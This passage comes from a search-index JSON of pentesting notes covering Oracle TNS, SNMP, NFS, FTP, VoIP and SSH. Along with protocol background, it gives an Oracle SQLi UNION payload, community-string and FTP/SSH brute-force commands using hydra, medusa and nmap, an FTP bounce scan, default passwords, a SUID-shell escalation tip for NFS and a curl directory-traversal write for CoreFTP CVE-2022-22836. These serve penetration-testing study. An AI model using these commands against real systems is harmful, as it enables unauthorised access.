TNS work","text":"","tags":["oracle tns","port 1521","port 162"]},{"location":"1521-oracle-transparent-network-substrate/#technical-components","title":"Technical components","text":"<p>The listener:  </p> <p>By default, the listener  (<code>listener.ora</code>) listens for incoming connections on the TCP/1521 port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including TCP/IP, UDP, IPX/SPX, and AppleTalk. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in Oracle 8i/9i but not in Oracle 10g/11g. </p> <p>Additionally, the listener will use Oracle Net Services to encrypt the communication between the client and the server. </p> <p>Configuration files for Oracle TNS</p> <p>The configuration files for Oracle TNS are called <code>tnsnames.ora</code> and <code>listener.ora</code> and are typically located in the <code>ORACLE_HOME/network/admin</code> directory. The client-side Oracle Net Services software uses the <code>tnsnames.ora</code> file to resolve service names to network addresses, while the listener process uses the <code>listener.ora</code> file to determine the services it should listen to and the behavior of the listener.</p> <p>tnsnames.ora</p> <p>Each database or service has a unique entry in the tnsnames.ora file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service.</p> <pre><code>Code: txt\n&gt;ORCL =\n  (DESCRIPTION =\n    (ADDRESS_LIST =\n      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))\n    )\n    (CONNECT_DATA =\n      (SERVER = DEDICATED)\n      (SERVICE_NAME = orcl)\n    )\n  )\n</code></pre> <p>listener.ora</p> <p>The <code>listener.ora</code> file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.</p> <pre><code>SID_LIST_LISTENER =\n  (SID_LIST =\n    (SID_DESC =\n      (SID_NAME = PDB1)\n      (ORACLE_HOME = C:\\oracle\\product\\19.0.0\\dbhome_1)\n      (GLOBAL_DBNAME = PDB1)\n      (SID_DIRECTORY_LIST =\n        (SID_DIRECTORY =\n          (DIRECTORY_TYPE = TNS_ADMIN)\n          (DIRECTORY = C:\\oracle\\product\\19.0.0\\dbhome_1\\network\\admin)\n        )\n      )\n    )\n  )\n\nLISTENER =\n  (DESCRIPTION_LIST =\n    (DESCRIPTION =\n      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))\n      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))\n    )\n  )\n\nADR_BASE_LISTENER = C:\\oracle\n</code></pre>","tags":["oracle tns","port 1521","port 162"]},{"location":"1521-oracle-transparent-network-substrate/#default-passwords","title":"Default passwords","text":"<ul> <li>Oracle 9 has a default password, CHANGE_ON_INSTALL.</li> <li>Oracle 10 has no default password set.</li> <li>The Oracle DBSNMP service also uses a default password, <code>dbsnmp</code>.</li> </ul>","tags":["oracle tns","port 1521","port 162"]},{"location":"1521-oracle-transparent-network-substrate/#plsql-exclusion-list","title":"PL/SQL Exclusion List","text":"<p>Oracle databases can be protected by using so-called PL/SQL Exclusion List (<code>PlsqlExclusionList</code>). It is a user-created text file that needs to be placed in the <code>$ORACLE_HOME/sqldeveloper</code> directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.</p> Setting Description <code>DESCRIPTION</code> A descriptor that provides a name for the database and its connection type. <code>ADDRESS</code> The network address of the database, which includes the hostname and port number. <code>PROTOCOL</code> The network protocol used for communication with the server <code>PORT</code> The port number used for communication with the server <code>CONNECT_DATA</code> Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier. <code>INSTANCE_NAME</code> The name of the database instance the client wants to connect. <code>SERVICE_NAME</code> The name of the service that the client wants to connect to. <code>SERVER</code> The type of server used for the database connection, such as dedicated or shared. <code>USER</code> The username used to authenticate with the database server. <code>PASSWORD</code> The password used to authenticate with the database server. <code>SECURITY</code> The type of security for the connection. <code>VALIDATE_CERT</code> Whether to validate the certificate using SSL/TLS. <code>SSL_VERSION</code> The version of SSL/TLS to use for the connection. <code>CONNECT_TIMEOUT</code> The time limit in seconds for the client to establish a connection to the database. <code>RECEIVE_TIMEOUT</code> The time limit in seconds for the client to receive a response from the database. <code>SEND_TIMEOUT</code> The time limit in seconds for the client to send a request to the database. <code>SQLNET.EXPIRE_TIME</code> The time limit in seconds for the client to detect a connection has failed. <code>TRACE_LEVEL</code> The level of tracing for the database connection. <code>TRACE_DIRECTORY</code> The directory where the trace files are stored. <code>TRACE_FILE_NAME</code> The name of the trace file. <code>LOG_FILE</code> The file where the log information is stored.","tags":["oracle tns","port 1521","port 162"]},{"location":"1521-oracle-transparent-network-substrate/#extra-bonus-dual","title":"Extra Bonus: DUAL","text":"<p>The DUAL is a special one row, one column table present by default in all Oracle databases. The owner of DUAL is SYS, but DUAL can be accessed by every user. This is a possible payload for SQLi:</p> <pre><code>'+UNION+SELECT+NULL+FROM+dual--\n</code></pre> <p>Oracle syntax requires the use of FROM, but some queries don't requires any table. For these case we use DUAL. Also Oracle doesn't allow the queries that employ information_schema.tables.</p>","tags":["oracle tns","port 1521","port 162"]},{"location":"161-162-snmp/","title":"161-162 SNMP Simple Network Management Protocol","text":"<p>Simple Network Management Protocol (SNMP) is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behaviour.</p> <p><code>Simple Network Management Protocol</code> (SNMP) was created to monitor and manage network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. Thus, it is a protocol for monitoring and managing network devices.</p> <p>Managers:  one or more administrative computers that have the task of monitoring or managing a group of hosts or devices on a computer network, the managed device.</p> <p>Managed devices:  routers, switches, servers, IoT devices, and many other devices.</p> <p>Agent:  network-management software module that resides on a managed device. An agent has local knowledge of management information and translates that information to or from an SNMP-specific form. </p> <p>In addition to the pure exchange of information, SNMP: </p> <ul> <li>Transmits control commands using agents over UDP port <code>161</code>. </li> <li>Enables the use of so-called <code>traps</code> over UDP port <code>162</code>. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.</li> </ul> <p>Management Information Base (MIB): For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides. And at this point, MIB is born. </p> <p>MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. MIB files are written in the <code>Abstract Syntax Notation One</code> (<code>ASN.1</code>) based ASCII text format. </p> <p>They contain <code>Object Identifier</code> (<code>OID</code>), at least one. In addition to the necessary unique address and a name, provides information about the type, access rights, and a description of the respective object. An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation.</p>","tags":["SNMP","port 161","port 162"]},{"location":"161-162-snmp/#snmpv1-snmpv2-and-snmpv3","title":"SNMPv1, SNMPv2 and SNMPv3","text":"<p>SNMP version 1 (SNMPv1) is used for network management and monitoring. SNMPv1 has no built-in authentication mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it does not support encryption, meaning that all data is sent in plain text and can be easily intercepted. </p> <p>SNMPv2 existed in different versions. The version still exists today is <code>v2c</code>, and the extension <code>c</code> means community-based SNMP. A significant problem with the initial execution of the SNMP protocol is that the community string that provides security is only transmitted in plain text, meaning it has no built-in encryption.</p> <p>SNMPv3: The security has been increased enormously for SNMPv3 by security features such as authentication using username and password and transmission encryption (via pre-shared key) of the data. However, the complexity also increases to the same extent, with significantly more configuration options than v2c.</p> <p>How can interception happens? Community strings can be seen as passwords that are used to determine whether the requested information can be viewed or not. It is important to note that many organizations are still using SNMPv2, as the transition to SNMPv3 can be very complex, but the services still need to remain active. SNMP Community strings provide information and statistics about a router or device. The manufacturer default community strings of <code>public</code> and <code>private</code> are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.</p>","tags":["SNMP","port 161","port 162"]},{"location":"161-162-snmp/#footprinting-snmp","title":"Footprinting SNMP","text":"<p>There are tools like snmpwalk, onesixtyone, and braa. </p>","tags":["SNMP","port 161","port 162"]},{"location":"161-162-snmp/#snmpwalk","title":"snmpwalk","text":"<p>snmpwalk is used to query the OIDs with their information. It retrieves a subtree of management values using SNMP GETNEXT requests.</p> <pre><code>snmpwalk -v2c -c public $ip\n</code></pre> <pre><code>snmpwalk -v 2c -c public $ip 1.3.6.1.2.1.1.5.0\n</code></pre> <pre><code>snmpwalk -v 2c -c private $ip\n</code></pre> <p>If we do not know the community string, we can use onesixtyone and SecLists wordlists to identify these community strings.</p>","tags":["SNMP","port 161","port 162"]},{"location":"161-162-snmp/#onesixtyone-fast-and-simple-snmp-scanner","title":"onesixtyone - Fast and simple SNMP scanner","text":"<p>A tool such as onesixtyone can be used to brute force the community string names using a dictionary file of common community strings such as the <code>dict.txt</code> file included in the GitHub repo for the tool.</p> <pre><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip\n</code></pre> <p>When certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify.</p>","tags":["SNMP","port 161","port 162"]},{"location":"161-162-snmp/#braa","title":"braa","text":"<p>Knowing a community string, we can use braa to brute-force the individual OIDs and enumerate the information behind them.</p> <pre><code>braa &lt;community string&gt;@$ip:.1.3.6.*   \n\n    # Example:\n    # braa public@10.129.14.128:.1.3.6.*\n</code></pre>","tags":["SNMP","port 161","port 162"]},{"location":"161-162-snmp/#installing-snmp","title":"Installing SNMP","text":"<p>The default configuration of the SNMP daemon is located at <code>/etc/snmp/snmpd.conf</code>. It contains basic settings for the service, which include the IP addresses, ports, MIB, OIDs, authentication, and community strings. See specifics about the configuration of this file in the manpage.</p> <p>Some classic misconfigurations are:</p> Settings Description <code>rwuser noauth</code> Provides access to the full OID tree without authentication. <code>rwcommunity &lt;community string&gt; &lt;IPv4 address&gt;</code> Provides access to the full OID tree regardless of where the requests were sent from. <code>rwcommunity6 &lt;community string&gt; &lt;IPv6 address&gt;</code> Same access as with <code>rwcommunity</code> with the difference of using IPv6.","tags":["SNMP","port 161","port 162"]},{"location":"161-162-snmp/#more-about-snmp-versioning-and-security","title":"More about SNMP versioning and security","text":"<p>Source: wikipedia</p> <p>SNMP is available in different versions, each has its own security issues. SNMP v1 sends passwords in clear-text over the network. Therefore, passwords can be read with packet sniffing. SNMP v2 allows password hashing with MD5, but this has to be configured. Virtually all network management software support SNMP v1, but not necessarily SNMP v2 or v3. SNMP v2 was specifically developed to provide data security, that is authentication, privacy and authorization, but only SNMP version 2c gained the endorsement of the Internet Engineering Task Force (IETF), while versions 2u and 2* failed to gain IETF approval due to security issues. SNMP v3 uses MD5, Secure Hash Algorithm (SHA) and keyed algorithms to offer protection against unauthorized data modification and spoofing attacks. If a higher level of security is needed the Data Encryption Standard (DES) can be optionally used in the cipher block chaining mode. SNMP v3 is implemented on Cisco IOS since release 12.0(3)T. SNMPv3 may be subject to brute force and dictionary attacks for guessing the authentication keys, or encryption keys, if these keys are generated from short (weak) passwords or passwords that can be found in a dictionary.</p>","tags":["SNMP","port 161","port 162"]},{"location":"1720-5060-5061-voip/","title":"Ports 1720, 5060 and 5061: VoIP","text":"<p>The most common VoIP ports are <code>TCP/5060</code> and <code>TCP/5061</code>, which are used for the Session Initiation Protocol (SIP). However, the port <code>TCP/1720</code> may also be used by some VoIP systems for the H.323 protocol, a set of standards for multimedia communication over packet-based networks. Still, SIP is more widely used than H.323 in VoIP systems.</p> <p>The most common SIP requests and methods are:</p> Method Description <code>INVITE</code> Initiates a session or invites another endpoint to participate. <code>ACK</code> Confirms the receipt of an INVITE request. <code>BYE</code> Terminate a session. <code>CANCEL</code> Cancels a pending INVITE request. <code>REGISTER</code> Registers a SIP user agent (UA) with a SIP server. <code>OPTIONS</code> Requests information about the capabilities of a SIP server or user agent, such as the types of media it supports."},{"location":"2049-nfs-network-file-system/","title":"Port 2049 -  NFS Network File System","text":"<p>Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. </p> <p>NFS is an Internet standard that governs the procedures in a distributed file system. While NFS protocol version 3.0 (<code>NFSv3</code>), which has been in use for many years, authenticates the client computer, this changes with <code>NFSv4</code>. Here, as with the Windows SMB protocol, the user must authenticate.</p> Version Features <code>NFSv2</code> It is older but is supported by many systems and was initially operated entirely over UDP. <code>NFSv3</code> It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients. <code>NFSv4</code> It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol. <p>NFS is based on the Open Network Computing Remote Procedure Call (ONC-RPC/SUN-RPC) protocol exposed on TCP and UDP ports 111, which uses External Data Representation (XDR) for the system-independent exchange of data. The NFS protocol has no mechanism for authentication or authorization. Instead, authentication is completely shifted to the RPC protocol's options.</p>","tags":["smb","port 2049","port 111","NFS","Network File System"]},{"location":"2049-nfs-network-file-system/#configuration-file","title":"Configuration file","text":"<p>The /etc/exports file contains a table of physical filesystems on an NFS server accessible by the clients. </p> <p>The default exports file also contains some examples of configuring NFS shares. First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets.</p> Option Description <code>rw</code> Read and write permissions. <code>ro</code> Read only permissions. <code>sync</code> Synchronous data transfer. (A bit slower) <code>async</code> Asynchronous data transfer. (A bit faster) <code>secure</code> Ports above 1024 will not be used. <code>insecure</code> Ports above 1024 will be used. <code>no_subtree_check</code> This option disables the checking of subdirectory trees. <code>root_squash</code> Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents <code>root</code> from accessing files on an NFS mount. <p>We can take a look at the <code>insecure</code> option. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.</p>","tags":["smb","port 2049","port 111","NFS","Network File System"]},{"location":"2049-nfs-network-file-system/#mounting-a-nfs-shared-folder","title":"Mounting a NFS shared folder","text":"<pre><code># Share the folder `/mnt/nfs` to the subnet $ip\necho '/mnt/nfs  $ip/24(sync,no_subtree_check)' &gt;&gt; /etc/exports\n\n# Restart the NFS service\nsystemctl restart nfs-kernel-server \n\nexportfs\n</code></pre> <p>We have shared the folder <code>/mnt/nfs</code> to the subnet <code>IP/24</code> with the setting shown above. This means that all hosts on the network will be able to mount this NFS share and inspect the contents of this folder.</p>","tags":["smb","port 2049","port 111","NFS","Network File System"]},{"location":"2049-nfs-network-file-system/#footprinting-the-service","title":"Footprinting the service","text":"<pre><code>sudo nmap $ip -p111,2049 -sV -sC\n\n# Also, run all NSE NFS scripts\nsudo nmap --script nfs* $ip -sV -p111,2049\n</code></pre> <p>Once we have discovered such an NFS service, we can mount it on our local machine. For this, we can create a new empty folder to which the NFS share will be mounted. Once mounted, we can navigate it and view the contents just like our local system.</p> <pre><code># Show Available NFS Shares\nshowmount -e $ip\n\n# Mounting NFS Share\nmkdir target-NFS\nsudo mount -t nfs $ip:/ ./target-NFS/ -o nolock\ncd target-NFS\ntree .\n\n# List Contents with Usernames &amp; Group Names\nls -l mnt/nfs/\n\n# List Contents with UIDs &amp; GUIDs\nls -n mnt/nfs/\n\n# Unmount the shared\nsudo umount ./target-NFS\n</code></pre> <p>By default nfs server has root_squash option on, which makes client access nobody:nogroup. To bypass it, sudo su your user to be root.</p>","tags":["smb","port 2049","port 111","NFS","Network File System"]},{"location":"2049-nfs-network-file-system/#attacking-wrong-configured-nfs","title":"Attacking wrong configured NFS","text":"<p>It is important to note that if the <code>root_squash</code> option is set, we cannot edit the <code>backup.sh</code> file even as <code>root</code>.</p> <p>We can also use NFS for further escalation. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the <code>SUID</code> of that user and then run the shell via the SSH user.</p>","tags":["smb","port 2049","port 111","NFS","Network File System"]},{"location":"2049-nfs-network-file-system/#more","title":"More","text":"<p>https://vk9-sec.com/2049-tcp-nfs-enumeration/.</p>","tags":["smb","port 2049","port 111","NFS","Network File System"]},{"location":"21-ftp/","title":"21 ftp","text":"<p>exi</p>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#21-ftp","title":"21 ftp","text":"<p>The File Transfer Protocol (FTP) is a standard communication protocol used to transfer computer files from a server to a client on a computer network. FTP is built on a client\u2013server model architecture using separate control and data connections between the client and the server. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as <code>HTTP</code> or <code>POP</code>.</p> <p>FTP users may authenticate themselves with a clear-text sign-in protocol, generally in the form of a username and password. However, they can connect anonymously if the server is configured to allow it. For secure transmission that protects the username and password and encrypts the content, FTP is often secured with SSL/TLS (FTPS) or replaced with SSH File Transfer Protocol (SFTP).</p> <p>However, if the network administrators choose to wrap the connection with the SSL/TLS protocol or tunnel the FTP connection through SSH to add a layer of encryption that only the source and destination hosts can decrypt, this would successfully foil most Man-in-the-Middle attacks.</p>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#how-it-works","title":"How it works","text":"","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#the-connection","title":"The connection","text":"<p>1. First, the client and server establish a control channel through <code>TCP port 21</code>. The client sends commands to the server, and the server returns status codes. </p> <p>2. Then both communication participants can establish the data channel via <code>TCP port 20</code>. This channel is used exclusively for data transmission, and the protocol watches for errors during this process.</p>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#active-and-passive-ftp","title":"Active and passive FTP","text":"<p>A distinction is made between <code>active</code> and <code>passive</code> FTP. In the active variant, the client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the <code>passive mode</code> has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.</p>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#installation","title":"Installation","text":"<p>You may need to install ftp service. Run:</p> <pre><code>sudo apt install ftp -y\n</code></pre> <p>Then to connect with ftp, run:</p> <pre><code>ftp $ip \n</code></pre> <p>The prompt will ask us for the username we want to log in with. Here is where the magic happens. A typical misconfiguration for running FTP services allows an anonymous account to access the service like any other authenticated user. The anonymous username can be input when the prompt appears, followed by any password whatsoever since the service will disregard the password for this specific account.</p>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#basic-usage","title":"Basic usage","text":"<pre><code># Connect with ftp\nftp $ip\n\n# If anonymous login is allowed, enter anonymous as user and press Enter when prompted for password\n\n# Give you a list of available commands\nhelp\n\n# List directories and files\nls\n\n# List recursively. Not always available, only in some configurations\nls -R\n\n# Change to a directory\ncd &lt;folder&gt;\n\n# Download a file to your localhost\nget &lt;nameofFileInOrigin&gt; &lt;nameOfFileInLocalhost&gt;\n\n# Download multiple files to your localhost\nmget *.* &lt;nameOfFileInLocalhost&gt;\n\n# Upload a file from your localhost\nput &lt;yourfile&gt;\n\n# Upload multiple files from your localhost\nmput *.*\n\n# Exit connection\nquit\n\n# Connect in passive mode\nftp -p $ip\n# The `-p` flag in the `ftp` command on Linux is used to enable passive mode for the file transfer protocol (FTP) connection. Passive mode is a mode of FTP where the data connection is initiated by the client rather than the server. This can be useful when the client is behind a firewall or NAT (Network Address Translation) that does not allow incoming connections. \n</code></pre> <p>More posibilities with wget:</p> <pre><code># Download all available files at once\nwget -m --no-passive ftp://anonymous:anonymous@$ip\n</code></pre>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#footprinting-with-nmap","title":"Footprinting with nmap","text":"<pre><code># Locate all ftp scripts related\nfind / -type f -name ftp* 2&gt;/dev/null | grep scripts\n\n# Run a general scanner for version, mode aggresive and perform default scripts\nsudo nmap -sV -p21 -sC -A $ip --script-trace\n# --script-trace &gt; trace the progress of NSE scripts at the network level\n# -sV &gt;\u00a0version scan \n# -A &gt; aggressive scan \n# -sC &gt; the default script scan\n</code></pre> <p>Some nmap scripts related to ftp:</p> <pre><code># ftp-anon NSE script checks whether the FTP server allows anonymous access.\n# ftp-syst, for example, executes the `STAT` command, which displays information about the FTP server status.\n</code></pre> <p>See more about nmap for scanning, running scripts and footprinting </p>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#interact-with-the-service","title":"Interact with the service","text":"<pre><code>nc -nv $ip 21\ntelnet $ip 21\nopenssl s_client -connect $ip:21 -starttls ftp\n</code></pre>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#attacking-ftp","title":"Attacking FTP","text":"","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#anonymous-access-enabled","title":"Anonymous access enabled","text":"<pre><code># Download all available files at once\nwget -m --no-passive ftp://anonymous:anonymous@$ip\n</code></pre>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#brute-forcing-with-medusa","title":"Brute forcing with Medusa","text":"<p>Medusa Cheat sheet. </p> <pre><code># Brute force FTP logging\nmedusa -u fiona -P /usr/share/wordlists/rockyou.txt -h $IP -M ftp\n# -u: username\n# -U: list of Usernames\n# -p: password\n# -P: list of passwords\n# -h: host /IP\n# -M: protocol to bruteforce\n</code></pre> <p>However Medusa is very slow in comparison to hydra:</p> <pre><code># Example for ftp in a non default port\nhydra -L users.txt -P pass.txt ftp://$ip:2121\n</code></pre>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#ftp-bounce-attack","title":"FTP Bounce Attack","text":"<p>An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. For instance, consider we are targetting an FTP Server\u00a0<code>FTP_DMZ</code>\u00a0exposed to the internet. Another device within the same network,\u00a0<code>Internal_DMZ</code>, is not exposed to the internet. We can use the connection to the\u00a0<code>FTP_DMZ</code>\u00a0server to scan\u00a0<code>Internal_DMZ</code>\u00a0using the FTP Bounce attack and obtain information about the server's open ports.</p> <pre><code>nmap -Pn -v -n -p80 -b anonymous:password@$ipFTPdmz $ipINTERNALdmz\n# -b The\u00a0`Nmap`\u00a0-b flag can be used to perform an FTP bounce attack: \n</code></pre>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#coreftp-server-build-725-directory-traversal-authenticated","title":"CoreFTP Server build 725 - Directory Traversal (Authenticated)","text":"<p>CVE-2022-22836 |  \u00a0exploit</p> <p>Summary: This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files. </p> <p>The\u00a0exploit\u00a0for this attack is relatively straightforward, based on a single\u00a0<code>cURL</code>\u00a0command.</p> <pre><code>curl -k -X PUT -H \"Host: &lt;IP&gt;\" --basic -u &lt;username&gt;:&lt;password&gt; --data-binary \"PoC.\" --path-as-is https://&lt;IP&gt;/../../../../../../whoops\n</code></pre> <p>We create a raw HTTP\u00a0<code>PUT</code>\u00a0request (<code>-X PUT</code>) with basic auth (<code>--basic -u &lt;username&gt;:&lt;password&gt;</code>), the path for the file (<code>--path-as-is https://&lt;IP&gt;/../../../../../whoops</code>), and its content (<code>--data-binary \"PoC.\"</code>) with this command. Additionally, we specify the host header (<code>-H \"Host: &lt;IP&gt;\"</code>) with the IP address of our target system.</p>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#other-ftp-services","title":"Other FTP services","text":"","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#tftp","title":"TFTP","text":"<p>Trivial File Transfer Protocol (<code>TFTP</code>) is simpler than FTP and performs file transfers between client and server processes.</p> <ul> <li>It does not provide user authentication and other valuable features supported by FTP.</li> <li>It uses  UDP.</li> <li>It does not require the user's authentication</li> </ul> <p>Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks.</p>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#basic-usage_1","title":"Basic usage","text":"<pre><code># Sets the remote host, and optionally the port, for file transfers.\nconnect\n\n# Transfers a file or set of files from the remote host to the local host.\nget\n\n# Transfers a file or set of files from the local host onto the remote host\nput\n\n# Exits tftp\nquit\n\n# Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on\nstatus\n\n# Turns verbose mode, which displays additional information during file transfer, on or off.\nverbose \n\n# Unlike the FTP client, TFTP does not have directory listing functionality.\n</code></pre>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#vsftpd","title":"vsFTPd","text":"<p>One of the most used FTP servers on Linux-based distributions is vsFTPd. </p>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#installation_1","title":"Installation","text":"<pre><code>sudo apt install vsftpd \n</code></pre>","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"21-ftp/#configuration-file","title":"Configuration file","text":"<p>The default configuration of vsFTPd can be found in <code>/etc/vsftpd.conf</code>.</p> <pre><code>cat /etc/vsftpd.conf | grep -v \"#\"\n</code></pre> Setting Description <code>listen=NO</code> Run from inetd or as a standalone daemon? <code>listen_ipv6=YES</code> Listen on IPv6 ? <code>anonymous_enable=NO</code> Enable Anonymous access? <code>local_enable=YES</code> Allow local users to login? <code>dirmessage_enable=YES</code> Display active directory messages when users go into certain directories? <code>use_localtime=YES</code> Use local time? <code>xferlog_enable=YES</code> Activate logging of uploads/downloads? <code>connect_from_port_20=YES</code> Connect from port 20? <code>secure_chroot_dir=/var/run/vsftpd/empty</code> Name of an empty directory <code>pam_service_name=vsftpd</code> This string is the name of the PAM service vsftpd will use. <code>rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</code> The last three options specify the location of the RSA certificate to use for SSL encrypted connections. <code>rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</code> <code>ssl_enable=NO</code> <p>In addition, there is a file called <code>/etc/ftpusers</code> that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. </p> <pre><code>cat /etc/ftpusers\n</code></pre> <p>Dangerous settings:</p> Setting Description <code>anonymous_enable=YES</code> Allowing anonymous login? <code>anon_upload_enable=YES</code> Allowing anonymous to upload files? <code>anon_mkdir_write_enable=YES</code> Allowing anonymous to create new directories? <code>no_anon_password=YES</code> Do not ask anonymous for password? <code>anon_root=/home/username/ftp</code> Directory for anonymous. <code>write_enable=YES</code> Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?","tags":["ftp","port 21","port 20","tftp","vsFTPd"]},{"location":"22-ssh/","title":"Port 22 - Secure Shell (SSH)","text":"<p>Secure Shell (SSH) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port TCP 22. </p> <p>Implemented natively on all Linux distributions and MacOS, SSH can also be used on Windows, with an appropriate program. The well-known OpenBSD SSH (<code>OpenSSH</code>) server on Linux distributions is an open-source fork of the original and commercial <code>SSH</code> server from SSH Communication Security.</p> <p>There are two competing protocols: SSH-1 and SSH-2. SSH-2, also known as SSH version 2, is a more advanced protocol than SSH version 1 in encryption, speed, stability, and security. For example, SSH-1 is vulnerable to MITM attacks, whereas SSH-2 is not.</p> <p>The SSH server runs on TCP port 22 by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: symmetric encryption, asymmetric encryption, and hashing.</p>","tags":["pentesting","web","pentesting","port","22"]},{"location":"22-ssh/#footprinting-ssh","title":"Footprinting ssh","text":"","tags":["pentesting","web","pentesting","port","22"]},{"location":"22-ssh/#ssh-audit","title":"ssh-audit","text":"<pre><code># Installation and execution\ngit clone https://github.com/jtesta/ssh-audit.git \n\n# Execute\ncd ssh-audit\n./ssh-audit.py $ip\n</code></pre>","tags":["pentesting","web","pentesting","port","22"]},{"location":"22-ssh/#nmap","title":"nmap","text":"<p>Brute force script: </p> <pre><code>nmap $ip -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/nmap/nselib/data/passwords.lst\n</code></pre> <p>OpenSSH 7.6p1 Ubuntu ubuntu0.3 is well known for some vulnerabilities.</p>","tags":["pentesting","web","pentesting","port","22"]},{"location":"22-ssh/#connect-with-ssh","title":"Connect with ssh","text":"<pre><code>ssh &lt;user&gt;@$ip\n\n# connect with a ssh key\nssh -i id_rsa &lt;user&gt;@$ip\n</code></pre>","tags":["pentesting","web","pentesting","port","22"]},{"location":"22-ssh/#installing-a-ssh-service","title":"Installing a ssh service","text":"<p>The sshd_config file, responsible for the OpenSSH server, has only a few of the settings configured by default. However, the default configuration includes X11 forwarding, which contained a command injection vulnerability in version 7.2p1 of OpenSSH in 2016. </p> <p>Configuration file: <code>/etc/ssh/sshd_config</code>.</p> <p>Common misconfigurations:</p> Setting Description <code>PasswordAuthentication yes</code> Allows password-based authentication. <code>PermitEmptyPasswords yes</code> Allows the use of empty passwords. <code>PermitRootLogin yes</code> Allows to log in as the root user. <code>Protocol 1</code> Uses an outdated version of encryption. <code>X11Forwarding yes</code> Allows X11 forwarding for GUI applications. <code>AllowTcpForwarding yes</code> Allows forwarding of TCP ports. <code>PermitTunnel</code> Allows tunneling. <code>DebianBanner 